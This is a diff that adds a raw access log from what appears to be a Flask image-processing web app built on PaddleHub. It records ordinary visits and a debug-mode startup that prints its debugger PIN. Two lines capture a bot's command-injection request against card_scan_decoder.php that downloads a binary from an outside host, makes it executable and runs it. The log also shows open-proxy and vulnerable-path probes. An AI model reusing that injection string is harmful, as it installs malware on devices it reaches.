@@ -1,0 +1,153 @@
+face_landmark_localization == 1.0.2
+deeplabv3p_xception65_humanseg == 1.0.0
+ * Serving Flask app "paddlehub.serving.app_single" (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: off
+2020-06-05 02:46:04,899-INFO:  * Running on http://0.0.0.0:8866/ (Press CTRL+C to quit)
+ERROR: unknown command 'python'
+
+Usage:
+hub <command> [options]
+
+Commands:
+  download       		Download PaddlePaddle pretrained model/module files.
+  run            		Run the specific module.
+  show           		Show the information of PaddleHub module.
+  version        		Show PaddleHub's version.
+  list           		List all installed PaddleHub modules.
+  install        		Install PaddleHub module.
+  uninstall      		Uninstall PaddleHub module.
+  search         		Search PaddleHub pretrained model through model keywords.
+  help           		Show help for commands.
+  clear          		Clear all cached data.
+  config         		Configure PaddleHub.
+  autofinetune   		PaddleHub helps to finetune a task by searching hyperparameters automatically.
+  serving        		Start Module Serving or Bert Service for online predicting.
+
+ * Serving Flask app "app" (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: on
+ * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 270-138-152
+103.216.42.38 - - [05/Jun/2020 02:46:47] "[37mGET / HTTP/1.1[0m" 200 -
+103.216.42.38 - - [05/Jun/2020 02:46:48] "[36mGET /static/favicon.ico HTTP/1.1[0m" 304 -
+103.216.42.38 - - [05/Jun/2020 02:46:50] "[37mGET /ocr HTTP/1.1[0m" 200 -
+103.216.42.38 - - [05/Jun/2020 02:46:50] "[37mGET /yanzhi HTTP/1.1[0m" 200 -
+103.216.42.38 - - [05/Jun/2020 02:46:54] "[37mGET /ocr HTTP/1.1[0m" 200 -
+103.216.42.38 - - [05/Jun/2020 02:46:55] "[37mGET / HTTP/1.1[0m" 200 -
+223.104.56.114 - - [05/Jun/2020 02:49:15] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+223.104.56.114 - - [05/Jun/2020 02:49:15] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+223.104.56.114 - - [05/Jun/2020 02:49:17] "[37mGET / HTTP/1.1[0m" 200 -
+223.104.56.114 - - [05/Jun/2020 02:49:19] "[37mGET /static/favicon.ico HTTP/1.1[0m" 200 -
+223.104.56.114 - - [05/Jun/2020 02:49:25] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+223.104.56.114 - - [05/Jun/2020 02:49:25] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+223.104.56.114 - - [05/Jun/2020 02:49:29] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+223.104.56.114 - - [05/Jun/2020 02:49:29] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+223.104.56.114 - - [05/Jun/2020 02:49:52] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+223.104.56.114 - - [05/Jun/2020 02:49:52] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+223.104.56.114 - - [05/Jun/2020 02:49:57] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+223.104.56.114 - - [05/Jun/2020 02:49:57] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+223.104.56.114 - - [05/Jun/2020 02:49:57] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+223.104.56.114 - - [05/Jun/2020 02:49:57] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+223.104.56.114 - - [05/Jun/2020 02:49:57] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+223.104.56.114 - - [05/Jun/2020 02:49:57] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+223.104.56.114 - - [05/Jun/2020 02:50:00] "[37mGET / HTTP/1.1[0m" 200 -
+223.104.56.114 - - [05/Jun/2020 02:50:00] "[36mGET /static/favicon.ico HTTP/1.1[0m" 304 -
+223.104.56.114 - - [05/Jun/2020 02:50:07] "[37mGET /ocr HTTP/1.1[0m" 200 -
+223.104.56.114 - - [05/Jun/2020 02:50:07] "[36mGET /static/favicon.ico HTTP/1.1[0m" 304 -
+223.104.56.114 - - [05/Jun/2020 02:50:21] "[37mPOST /ocr HTTP/1.1[0m" 200 -
+223.104.56.114 - - [05/Jun/2020 02:50:21] "[37mGET /static/css/navbar.css HTTP/1.1[0m" 200 -
+223.104.56.114 - - [05/Jun/2020 02:50:21] "[36mGET /static/favicon.ico HTTP/1.1[0m" 304 -
+223.104.56.114 - - [05/Jun/2020 02:50:32] "[37mGET /ocr HTTP/1.1[0m" 200 -
+223.104.56.114 - - [05/Jun/2020 02:50:32] "[36mGET /static/favicon.ico HTTP/1.1[0m" 304 -
+223.104.56.114 - - [05/Jun/2020 02:50:43] "[37mPOST /ocr HTTP/1.1[0m" 200 -
+223.104.56.114 - - [05/Jun/2020 02:50:43] "[36mGET /static/css/navbar.css HTTP/1.1[0m" 304 -
+223.104.56.114 - - [05/Jun/2020 02:50:43] "[36mGET /static/favicon.ico HTTP/1.1[0m" 304 -
+223.104.56.114 - - [05/Jun/2020 02:51:11] "[37mGET /meiyan HTTP/1.1[0m" 200 -
+223.104.56.114 - - [05/Jun/2020 02:51:11] "[36mGET /static/favicon.ico HTTP/1.1[0m" 304 -
+223.104.56.114 - - [05/Jun/2020 02:51:16] "[37mGET /yanzhi HTTP/1.1[0m" 200 -
+223.104.56.114 - - [05/Jun/2020 02:51:16] "[36mGET /static/favicon.ico HTTP/1.1[0m" 304 -
+223.104.56.114 - - [05/Jun/2020 02:51:40] "[37mPOST /yanzhi HTTP/1.1[0m" 200 -
+223.104.56.114 - - [05/Jun/2020 02:51:40] "[36mGET /static/css/navbar.css HTTP/1.1[0m" 304 -
+223.104.56.114 - - [05/Jun/2020 02:51:41] "[36mGET /static/favicon.ico HTTP/1.1[0m" 304 -
+223.104.56.114 - - [05/Jun/2020 02:51:54] "[37mGET /koutu HTTP/1.1[0m" 200 -
+223.104.56.114 - - [05/Jun/2020 02:51:54] "[36mGET /static/favicon.ico HTTP/1.1[0m" 304 -
+223.104.56.114 - - [05/Jun/2020 02:52:15] "[37mPOST /koutu HTTP/1.1[0m" 200 -
+223.104.56.114 - - [05/Jun/2020 02:52:16] "[36mGET /static/css/navbar.css HTTP/1.1[0m" 304 -
+223.104.56.114 - - [05/Jun/2020 02:52:16] "[36mGET /static/favicon.ico HTTP/1.1[0m" 304 -
+223.104.56.114 - - [05/Jun/2020 02:52:35] "[37mGET /ocr HTTP/1.1[0m" 200 -
+223.104.56.114 - - [05/Jun/2020 02:52:35] "[36mGET /static/favicon.ico HTTP/1.1[0m" 304 -
+59.126.58.95 - - [05/Jun/2020 02:57:37] "[37mGET / HTTP/1.1[0m" 200 -
+123.126.113.152 - - [05/Jun/2020 03:33:22] "[37mGET / HTTP/1.1[0m" 200 -
+42.236.82.156 - - [05/Jun/2020 03:38:00] "[37mGET / HTTP/1.1[0m" 200 -
+80.82.70.187 - - [05/Jun/2020 03:41:42] "[33mGET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1[0m" 404 -
+47.101.62.158 - - [05/Jun/2020 04:10:27] "[37mGET / HTTP/1.1[0m" 200 -
+213.217.0.184 - - [05/Jun/2020 04:17:23] "[37mGET / HTTP/1.1[0m" 200 -
+59.127.30.240 - - [05/Jun/2020 04:17:39] "[37mGET / HTTP/1.1[0m" 200 -
+47.97.220.124 - - [05/Jun/2020 04:19:46] "[37mGET / HTTP/1.1[0m" 200 -
+103.145.254.83 - - [05/Jun/2020 04:27:50] "[37mGET http://www.google.com/ HTTP/1.0[0m" 200 -
+112.66.96.59 - - [05/Jun/2020 04:27:51] "[37mHEAD http://123.125.114.144/ HTTP/1.1[0m" 200 -
+120.79.206.221 - - [05/Jun/2020 04:45:54] "[37mGET / HTTP/1.1[0m" 200 -
+47.100.51.108 - - [05/Jun/2020 04:48:27] "[37mGET / HTTP/1.1[0m" 200 -
+54.218.74.143 - - [05/Jun/2020 04:50:42] "[37mGET / HTTP/1.1[0m" 200 -
+117.132.183.17 - - [05/Jun/2020 05:28:21] "[37mGET / HTTP/1.1[0m" 200 -
+114.34.25.52 - - [05/Jun/2020 05:31:40] "[37mGET / HTTP/1.1[0m" 200 -
+60.190.199.170 - - [05/Jun/2020 06:23:10] "[33mGET /Public/home/appjs/Index.js HTTP/1.1[0m" 404 -
+91.139.2.18 - - [05/Jun/2020 06:38:26] "[37mGET / HTTP/1.1[0m" 200 -
+183.136.225.57 - - [05/Jun/2020 06:46:36] "[37mGET / HTTP/1.1[0m" 200 -
+207.46.13.5 - - [05/Jun/2020 07:19:57] "[37mGET / HTTP/1.1[0m" 200 -
+47.101.145.17 - - [05/Jun/2020 07:46:45] "[37mGET / HTTP/1.1[0m" 200 -
+139.162.106.181 - - [05/Jun/2020 07:47:32] "[37mGET / HTTP/1.1[0m" 200 -
+103.206.102.27 - - [05/Jun/2020 07:56:24] "[37mGET / HTTP/1.1[0m" 200 -
+220.132.47.113 - - [05/Jun/2020 08:15:14] "[37mGET / HTTP/1.1[0m" 200 -
+79.116.68.8 - - [05/Jun/2020 08:34:24] "[37mGET / HTTP/1.1[0m" 200 -
+218.161.9.80 - - [05/Jun/2020 08:49:59] "[37mGET / HTTP/1.1[0m" 200 -
+59.126.228.110 - - [05/Jun/2020 08:58:06] "[37mGET / HTTP/1.1[0m" 200 -
+178.128.93.138 - - [05/Jun/2020 09:35:31] "[37mGET / HTTP/1.0[0m" 200 -
+211.20.255.13 - - [05/Jun/2020 09:51:18] "[37mGET / HTTP/1.1[0m" 200 -
+223.104.56.114 - - [05/Jun/2020 09:54:17] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+223.104.56.114 - - [05/Jun/2020 09:54:17] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+223.104.56.114 - - [05/Jun/2020 09:54:19] "[37mGET / HTTP/1.1[0m" 200 -
+223.104.56.114 - - [05/Jun/2020 09:54:19] "[36mGET /static/favicon.ico HTTP/1.1[0m" 304 -
+223.104.56.114 - - [05/Jun/2020 09:54:36] "[37mPOST / HTTP/1.1[0m" 200 -
+223.104.56.114 - - [05/Jun/2020 09:54:38] "[37mPOST / HTTP/1.1[0m" 200 -
+223.104.56.114 - - [05/Jun/2020 09:54:43] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+223.104.56.114 - - [05/Jun/2020 09:54:43] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+223.104.56.114 - - [05/Jun/2020 09:54:48] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+223.104.56.114 - - [05/Jun/2020 09:54:49] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+223.104.56.114 - - [05/Jun/2020 09:54:50] "[37mGET / HTTP/1.1[0m" 200 -
+223.104.56.114 - - [05/Jun/2020 09:54:51] "[36mGET /static/favicon.ico HTTP/1.1[0m" 304 -
+223.104.56.114 - - [05/Jun/2020 09:54:55] "[37mGET /ocr HTTP/1.1[0m" 200 -
+223.104.56.114 - - [05/Jun/2020 09:54:56] "[36mGET /static/favicon.ico HTTP/1.1[0m" 304 -
+223.104.56.114 - - [05/Jun/2020 09:55:10] "[37mPOST /ocr HTTP/1.1[0m" 200 -
+223.104.56.114 - - [05/Jun/2020 09:55:10] "[36mGET /static/css/navbar.css HTTP/1.1[0m" 304 -
+223.104.56.114 - - [05/Jun/2020 09:55:10] "[36mGET /static/favicon.ico HTTP/1.1[0m" 304 -
+223.104.56.114 - - [05/Jun/2020 09:56:42] "[36mGET /static/favicon.ico HTTP/1.1[0m" 304 -
+223.104.56.114 - - [05/Jun/2020 09:59:20] "[36mGET /static/favicon.ico HTTP/1.1[0m" 304 -
+79.3.199.89 - - [05/Jun/2020 10:14:58] code 400, message Bad request syntax ('GET /card_scan_decoder.php?No=30&door=%60wget http://switchnets.net/hoho.arm7; chmod 777 hoho.arm7; ./hoho.arm7 linear%60 HTTP/1.1')
+79.3.199.89 - - [05/Jun/2020 10:14:58] "[35m[1mGET /card_scan_decoder.php?No=30&door=%60wget http://switchnets.net/hoho.arm7; chmod 777 hoho.arm7; ./hoho.arm7 linear%60 HTTP/1.1[0m" HTTPStatus.BAD_REQUEST -
+103.145.254.83 - - [05/Jun/2020 10:22:50] "[37mGET http://www.google.com/ HTTP/1.0[0m" 200 -
+182.138.137.137 - - [05/Jun/2020 10:26:36] "[37mHEAD http://123.125.114.144/ HTTP/1.1[0m" 200 -
+112.80.136.242 - - [05/Jun/2020 10:26:37] "[37mGET http://www.minghui.org/ HTTP/1.1[0m" 200 -
+113.128.105.229 - - [05/Jun/2020 10:26:37] "[37mGET http://www.epochtimes.com/ HTTP/1.1[0m" 200 -
+221.13.12.227 - - [05/Jun/2020 10:26:37] "[33mCONNECT www.voanews.com:443 HTTP/1.1[0m" 404 -
+106.45.0.168 - - [05/Jun/2020 10:26:39] "[37mGET http://www.wujieliulan.com/ HTTP/1.1[0m" 200 -
+60.177.179.126 - - [05/Jun/2020 10:26:40] "[37mGET http://www.123cha.com/ HTTP/1.1[0m" 200 -
+123.179.15.136 - - [05/Jun/2020 10:26:42] "[33mCONNECT www.ipip.net:443 HTTP/1.1[0m" 404 -
+117.14.149.171 - - [05/Jun/2020 10:26:43] "[33mGET http://www.rfa.org/english/ HTTP/1.1[0m" 404 -
+113.120.8.202 - - [05/Jun/2020 10:26:45] "[37mGET http://boxun.com/ HTTP/1.1[0m" 200 -
+58.48.131.41 - - [05/Jun/2020 10:26:46] "[33mCONNECT cn.bing.com:443 HTTP/1.1[0m" 404 -
+91.203.61.191 - - [05/Jun/2020 11:26:43] "[33mPOST /cgi-bin/mainfunction.cgi HTTP/1.1[0m" 404 -
+123.183.224.96 - - [05/Jun/2020 11:53:23] "[37mGET / HTTP/1.1[0m" 200 -
+162.243.141.59 - - [05/Jun/2020 12:04:10] "[33mGET /hudson HTTP/1.1[0m" 404 -
+223.104.56.114 - - [05/Jun/2020 12:18:38] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+223.104.56.114 - - [05/Jun/2020 12:20:54] "[37mGET / HTTP/1.1[0m" 200 -
+223.104.56.114 - - [05/Jun/2020 12:20:55] "[37mGET /static/favicon.ico HTTP/1.1[0m" 200 -
+223.104.56.114 - - [05/Jun/2020 12:21:00] "[37mPOST / HTTP/1.1[0m" 200 -
+223.104.56.114 - - [05/Jun/2020 12:21:00] "[37mGET / HTTP/1.1[0m" 200 -
